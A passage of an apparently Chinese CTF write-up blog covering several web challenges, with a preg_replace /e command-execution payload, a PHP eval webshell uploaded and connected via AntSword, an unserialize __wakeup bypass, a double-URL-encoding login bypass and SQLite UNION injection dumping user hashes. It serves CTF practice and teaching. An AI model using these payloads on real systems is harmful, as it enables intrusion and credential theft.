&#123;</span></span><br><span class="line"><span class="string">        var element = layui.element; //导航的hover效果、二级菜单等功能，需要依赖element模块</span></span><br><span class="line"><span class="string">        //监听导航点击</span></span><br><span class="line"><span class="string">        element.on(&#x27;nav(demo)&#x27;, function(elem) &#123;</span></span><br><span class="line"><span class="string">            //console.log(elem)</span></span><br><span class="line"><span class="string">            layer.msg(elem.text());</span></span><br><span class="line"><span class="string">        &#125;);</span></span><br><span class="line"><span class="string">    &#125;);</span></span><br><span class="line"><span class="string">    &lt;/script&gt;</span></span><br><span class="line"><span class="string">&lt;?php</span></span><br><span class="line"><span class="string"><span class="subst">$page</span> = <span class="subst">$_GET</span>[page];</span></span><br><span class="line"><span class="string">if (isset(<span class="subst">$page</span>)) &#123;</span></span><br><span class="line"><span class="string">if (ctype_alnum(<span class="subst">$page</span>)) &#123;</span></span><br><span class="line"><span class="string">?&gt;</span></span><br><span class="line"><span class="string">    &lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;</span></span><br><span class="line"><span class="string">    &lt;div style=&quot;</span>text-align:center<span class="string">&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;p class=&quot;</span>lead<span class="string">&quot;&gt;&lt;?php echo <span class="subst">$page</span>; die();?&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">    &lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;</span></span><br><span class="line"><span class="string">&lt;?php</span></span><br><span class="line"><span class="string">&#125;else&#123;</span></span><br><span class="line"><span class="string">?&gt;</span></span><br><span class="line"><span class="string">        &lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;</span></span><br><span class="line"><span class="string">        &lt;div style=&quot;</span>text-align:center<span class="string">&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;p class=&quot;</span>lead<span class="string">&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;?php</span></span><br><span class="line"><span class="string">                if (strpos(<span class="subst">$page</span>, &#x27;input&#x27;) &gt; 0) &#123;</span></span><br><span class="line"><span class="string">                    die();</span></span><br><span class="line"><span class="string">                &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                if (strpos(<span class="subst">$page</span>, &#x27;ta:text&#x27;) &gt; 0) &#123;</span></span><br><span class="line"><span class="string">                    die();</span></span><br><span class="line"><span class="string">                &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                if (strpos(<span class="subst">$page</span>, &#x27;text&#x27;) &gt; 0) &#123;</span></span><br><span class="line"><span class="string">                    die();</span></span><br><span class="line"><span class="string">                &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                if (<span class="subst">$page</span> === &#x27;index.php&#x27;) &#123;</span></span><br><span class="line"><span class="string">                    die(&#x27;Ok&#x27;);</span></span><br><span class="line"><span class="string">                &#125;</span></span><br><span class="line"><span class="string">                    include(<span class="subst">$page</span>);</span></span><br><span class="line"><span class="string">                    die();</span></span><br><span class="line"><span class="string">                ?&gt;</span></span><br><span class="line"><span class="string">        &lt;/p&gt;</span></span><br><span class="line"><span class="string">        &lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;?php</span></span><br><span class="line"><span class="string">&#125;&#125;</span></span><br><span class="line"><span class="string">//方便的实现输入输出的功能,正在开发中的功能，只能内部人员测</span></span><br><span class="line"><span class="string">if (<span class="subst">$_SERVER</span>[&#x27;HTTP_X_FORWARDED_FOR&#x27;] === &#x27;127.0.0.1&#x27;) &#123;</span></span><br><span class="line"><span class="string">    //来源ip为127.0.0.1</span></span><br><span class="line"><span class="string">    echo &quot;</span>&lt;br &gt;Welcome My Admin ! &lt;br &gt;<span class="string">&quot;;</span></span><br><span class="line"><span class="string">    <span class="subst">$pattern</span> = <span class="subst">$_GET</span>[pat];</span></span><br><span class="line"><span class="string">    <span class="subst">$replacement</span> = <span class="subst">$_GET</span>[rep];</span></span><br><span class="line"><span class="string">    <span class="subst">$subject</span> = <span class="subst">$_GET</span>[sub];</span></span><br><span class="line"><span class="string">    if (isset(<span class="subst">$pattern</span>) &amp;&amp; isset(<span class="subst">$replacement</span>) &amp;&amp; isset(<span class="subst">$subject</span>)) &#123;</span></span><br><span class="line"><span class="string">        preg_replace(<span class="subst">$pattern</span>, <span class="subst">$replacement</span>, <span class="subst">$subject</span>);</span></span><br><span class="line"><span class="string">        /*preg_replace(<span class="subst">$pattern</span>, <span class="subst">$replacement</span>, <span class="subst">$subject</span>)</span></span><br><span class="line"><span class="string">		作用：搜索subject中匹配pattern的部分， 以replacement的内容进行替换。</span></span><br><span class="line"><span class="string">		<span class="subst">$pattern</span>:       要搜索的模式，可以是字符串或一个字符串数组。</span></span><br><span class="line"><span class="string">		<span class="subst">$replacement</span>:   用于替换的字符串或字符串数组。</span></span><br><span class="line"><span class="string">		<span class="subst">$subject</span>:       要搜索替换的目标字符串或字符串数组。</span></span><br><span class="line"><span class="string">		*/</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        /*利用preg_replace()函数的/e漏洞进行代码执行</span></span><br><span class="line"><span class="string">          /e 修正符使 preg_replace() 将 replacement 参数当作 PHP 代码（在适当的逆向</span></span><br><span class="line"><span class="string">		  引用替换完之后）。</span></span><br><span class="line"><span class="string">		  提示：要确保 replacement 构成一个合法的 PHP 代码字符串，</span></span><br><span class="line"><span class="string">		  否则 PHP 会在报告在包含 preg_replace() 的行中出现语法解析错误。</span></span><br><span class="line"><span class="string">		  也就是说只要在subject中有要搜索的pattern的内容，同时将在replacement前加上/e，触发/e漏洞，就可以执行			  replacement中的正确的php代码</span></span><br><span class="line"><span class="string">		*/</span></span><br><span class="line"><span class="string">    &#125;else&#123;</span></span><br><span class="line"><span class="string">        die();</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">?&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br></pre></td></tr></table></figure>

<p>在URL中传参，在burpsuite中修改X-Forwarded-For: 127.0.0.1</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221205163039073.png" alt="image-20221205163039073"></p>
<p>查看s3chahahaDir</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?pat=//e&amp;rep=system(&quot;ls%20-R%20s3chahahaDir&quot;)&amp;sub=1</span><br></pre></td></tr></table></figure>

<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221205163306990.png" alt="image-20221205163306990"></p>
<p>查看flag.php</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221205163450627.png" alt="image-20221205163450627"></p>
<h2 id="35-upload1"><a href="#35-upload1" class="headerlink" title="35.upload1"></a>35.upload1</h2><p>打开</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221206130821581.png" alt="image-20221206130821581"></p>
<p>一般是构建一句话木马，利用burpsuite修改包后缀名（一般会限制上传文件类型），上传成功以后注意文件位置，利用菜刀或者是中国蚁剑进行连接， 然后获得flag</p>
<p>构造木马：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;123&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span>(<span class="string">&#x27;123&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>制造一个上传文件</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221206131856340.png" alt="image-20221206131856340"></p>
<p>中国蚁剑连接</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221206133124969.png" alt="image-20221206133124969"></p>
<p>连接</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221206133157784.png" alt="image-20221206133157784"></p>
<p>查看上一层</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221206133212760.png" alt="image-20221206133212760"></p>
<p>找到flag，查看flag</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221206133243894.png" alt="image-20221206133243894"></p>
<h2 id="36-unserialize3"><a href="#36-unserialize3" class="headerlink" title="36.unserialize3"></a>36.unserialize3</h2><p>打开</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221206133333070.png" alt="image-20221206133333070"></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">xctf</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$flag</span> = <span class="string">&#x27;111&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">exit</span>(<span class="string">&#x27;bad requests&#x27;</span>);</span><br><span class="line">    <span class="comment">//如果执行了wakeup代码，就会退出</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">?code=</span><br></pre></td></tr></table></figure>

<p>书写序列化代码，反序列化xctf类的同时还要绕过__wakeup方法的执行</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">xctf</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$flag</span> = <span class="string">&#x27;111&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">exit</span>(<span class="string">&#x27;bad requests&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$peak</span> = <span class="keyword">new</span> <span class="title function_ invoke__">xctf</span>();</span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$peak</span>));</span><br></pre></td></tr></table></figure>

<p>运行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;xctf&quot;:1:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>要绕过wakeup方法，修改长度即可</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;xctf&quot;:2:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>然后访问</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221206135845573.png" alt="image-20221206135845573"></p>
<h2 id="37-PHP2"><a href="#37-PHP2" class="headerlink" title="37.PHP2"></a>37.PHP2</h2><p>打开</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221206140219245.png" alt="image-20221206140219245"></p>
<p>发现只是一个简单的网页，连传参都没有，进行目录扫描</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221206141040223.png" alt="image-20221206141040223"></p>
<p>扫描到</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.phps</span><br></pre></td></tr></table></figure>

<p>打开</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221206141153392.png" alt="image-20221206141153392"></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="string">&quot;admin&quot;</span>===<span class="variable">$_GET</span>[id]) &#123;</span><br><span class="line">  <span class="keyword">echo</span>(<span class="string">&quot;&lt;p&gt;not allowed!&lt;/p&gt;&quot;</span>);</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_GET</span>[id] = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$_GET</span>[id]);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[id] == <span class="string">&quot;admin&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Access granted!&lt;/p&gt;&quot;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Key: xxxxxxx &lt;/p&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">Can you anthenticate to this website?</span><br></pre></td></tr></table></figure>

<p>当传入参数id时，浏览器在后面会对非ASCII码的字符进行一次urlencode</p>
<p>然后在这段代码中运行时，会自动进行一次urldecode</p>
<p>在urldecode()函数中，再一次进行一次解码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">urldecode</span>(%<span class="number">2561</span>)=%<span class="number">61</span></span><br><span class="line"><span class="title function_ invoke__">urldecode</span>(%<span class="number">61</span>)=a</span><br></pre></td></tr></table></figure>


<p>即，当第一次比较时，实际是</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="string">&quot;admin&quot;</span>===<span class="string">&quot;%61dmin&quot;</span>) </span><br></pre></td></tr></table></figure>


<p>而经过</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_GET</span>[id] = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$_GET</span>[id]);</span><br></pre></td></tr></table></figure>

<p>第二次比较是：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="string">&quot;admin&quot;</span> == <span class="string">&quot;admin&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>payload：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=%<span class="number">2561</span>dmin</span><br></pre></td></tr></table></figure>

<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221206142756413.png" alt="image-20221206142756413"></p>
<h2 id="38-FlatScience"><a href="#38-FlatScience" class="headerlink" title="38.FlatScience"></a>38.FlatScience</h2><p>打开</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221208123258238.png" alt="image-20221208123258238"></p>
<p>每个地方都点一下，发现都是论文</p>
<p>扫描目录</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221208123521085.png" alt="image-20221208123521085"></p>
<p>打开看看</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221208123556089.png" alt="image-20221208123556089"></p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221208123629681.png" alt="image-20221208123629681"></p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221208123643769.png" alt="image-20221208123643769"></p>
<p>查看login.php源代码</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221208124841983.png" alt="image-20221208124841983"></p>
<p>在URL中输入?debug试试</p>
<p>发现了PHP代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;usr&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pw&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$user </span>= <span class="variable">$_POST</span>[<span class="string">&#x27;usr&#x27;</span>];</span><br><span class="line">        <span class="variable">$pass </span>= <span class="variable">$_POST</span>[<span class="string">&#x27;pw&#x27;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="variable">$db </span>= <span class="keyword">new</span><span class="title function_ invoke__"> SQLite3</span>(<span class="string">&#x27;../fancy.db&#x27;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="variable">$res </span>= <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&quot;SELECT id,name from Users where name=&#x27;&quot;</span>.<span class="variable">$user</span>.<span class="string">&quot;&#x27; and password=&#x27;&quot;</span>.<span class="title function_ invoke__">sha1</span>(<span class="variable">$pass</span>.<span class="string">&quot;Salz!&quot;</span>).<span class="string">&quot;&#x27;&quot;</span>);</span><br><span class="line">    <span class="comment">//password=pass跟Salz!拼接然后sha1加密</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$res</span>)&#123;</span><br><span class="line">        <span class="variable">$row </span>= <span class="variable">$res</span>-&gt;<span class="title function_ invoke__">fetchArray</span>();</span><br><span class="line">        <span class="comment">//fetch_array()与fetch_all()都是在数据库连接成功的情况下，在查询数据后，对查询出的数据的读取方式。</span></span><br><span class="line">        <span class="comment">//fetch_array()一行一行的读，以数组方式读取；fetch_all()全部读取</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;Some Error occourred!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$row</span>[<span class="string">&#x27;id&#x27;</span>]))&#123;</span><br><span class="line">            <span class="title function_ invoke__">setcookie</span>(<span class="string">&#x27;name&#x27;</span>,<span class="string">&#x27; &#x27;</span>.<span class="variable">$row</span>[<span class="string">&#x27;name&#x27;</span>], <span class="title function_ invoke__">time</span>() + <span class="number">60</span>, <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">        <span class="comment">//返回的数据在setcookie中</span></span><br><span class="line">            <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: /&quot;</span>);</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;debug&#x27;</span>]))</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;login.php&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>可以尝试SQL注入，这里是SQLite</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221208130846254.png" alt="image-20221208130846254"></p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221208130910916.png" alt="image-20221208130910916"></p>
<p>有两个字段</p>
<p>SQLite 数据库中有一个叫 SQLite_master 的表它定义数据库的模式。</p>
<p>SQLITE_MASTER 表看 起来如下： </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE sqlite_master (</span><br><span class="line">    type TEXT， </span><br><span class="line">    name TEXT, </span><br><span class="line">    tbl_name TEXT, </span><br><span class="line">    rootpage INTEGER, </span><br><span class="line">    sql TEXT ); </span><br></pre></td></tr></table></figure>

<p>对于表来说，type 字段永远是’table’,name 永远是表的名字</p>
<p>Sqlite_master 隐藏表如下</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221208131614245.png" alt="image-20221208131614245"></p>
<p>据报错，可以知道有两列数据，可以开始注入，先爆出 sqlite_master 里所有的表名</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; union select 1,name from sqlite_master where type=&#x27;</span><span class="keyword">table</span><span class="string">&#x27; order by name--+</span></span><br></pre></td></tr></table></figure>

<p>注入后的响应在 set-cookie中</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221208133108287.png" alt="image-20221208133108287"></p>
<p>查询sql 语句</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;union select name,sql from sqlite_master --+</span></span><br></pre></td></tr></table></figure>

<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221208133709172.png" alt="image-20221208133709172"></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> Users(</span><br><span class="line">    id <span class="type">int</span> <span class="keyword">primary</span> key,</span><br><span class="line">    name <span class="type">varchar</span>(<span class="number">255</span>),</span><br><span class="line">    password <span class="type">varchar</span>(<span class="number">255</span>),</span><br><span class="line">    hint <span class="type">varchar</span>(<span class="number">255</span>)</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p>查询name，password， hint</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; union select 1,group_concat(name) from users --+</span></span><br></pre></td></tr></table></figure>

<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221208134532721.png" alt="image-20221208134532721"></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; union select 1,group_concat(password) from users --+</span></span><br></pre></td></tr></table></figure>

<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221208134625483.png" alt="image-20221208134625483"></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; union select 1,group_concat(hint) from users --+</span></span><br></pre></td></tr></table></figure>

<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221208135101737.png" alt="image-20221208135101737"></p>
<p>可以得到一张完整的 Users 表</p>
<table>
<thead>
<tr>
<th>id</th>
<th>name</th>
<th>password</th>
<th>hint</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>admin</td>
<td>3fab54a50e770d830c0416df817567662a9dc85c</td>
<td>+my+fav+word+in+my+fav+paper?!</td>
</tr>
<tr>
<td>2</td>
<td>fritze</td>
<td>54eae8935c90f467427f05e4ece82cf569f89507</td>
<td>+my+love+is…?</td>
</tr>
<tr>
<td>3</td>
<td>hansi</td>
<td>34b0bb7c304949f9ff2fc101eef0f048be10d3bd</td>
<td>+the+password+is+password</td>
</tr>
</tbody></table>
<p>前面看到的 pdf 里面，需要写个脚本，把里面的词都给提取出来，拼接上”Salz!”然后 sha1 加密，看看是否跟 3fab54a50e770d830c0416df817567662a9dc85c 相等</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">re1 = <span class="string">&#x27;[a-fA-F0-9]&#123;32,32&#125;.pdf&#x27;</span></span><br><span class="line">re2 = <span class="string">&#x27;[0-9\/]&#123;2,2&#125;index.html&#x27;</span></span><br><span class="line"></span><br><span class="line">pdf_list = []</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_pdf</span>(<span class="params">url</span>):</span><br><span class="line">    <span class="keyword">global</span> pdf_list </span><br><span class="line">    <span class="built_in">print</span>(url)</span><br><span class="line">    req = requests.get(url).text</span><br><span class="line">    re_1 = re.findall(re1,req)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> re_1:</span><br><span class="line">        pdf_url = url+i</span><br><span class="line">        pdf_list.append(pdf_url)</span><br><span class="line">    re_2 = re.findall(re2,req)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> re_2:</span><br><span class="line">        new_url = url+j[<span class="number">0</span>:<span class="number">2</span>]</span><br><span class="line">        get_pdf(new_url)</span><br><span class="line">    <span class="keyword">return</span> pdf_list</span><br><span class="line">    <span class="comment"># return re_2</span></span><br><span class="line"></span><br><span class="line">pdf_list = get_pdf(<span class="string">&#x27;http://220.249.52.133:46876/&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(pdf_list)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> pdf_list:</span><br><span class="line">    os.system(<span class="string">&#x27;wget &#x27;</span>+i)</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> StringIO</span><br><span class="line"></span><br><span class="line"><span class="comment">#python3</span></span><br><span class="line"><span class="keyword">from</span> pdfminer.pdfpage <span class="keyword">import</span> PDFPage</span><br><span class="line"><span class="keyword">from</span> pdfminer.converter <span class="keyword">import</span> TextConverter</span><br><span class="line"><span class="keyword">from</span> pdfminer.converter <span class="keyword">import</span> PDFPageAggregator</span><br><span class="line"><span class="keyword">from</span> pdfminer.layout <span class="keyword">import</span> LTTextBoxHorizontal, LAParams</span><br><span class="line"><span class="keyword">from</span> pdfminer.pdfinterp <span class="keyword">import</span> PDFResourceManager, PDFPageInterpreter</span><br><span class="line"></span><br><span class="line"></span><br><span 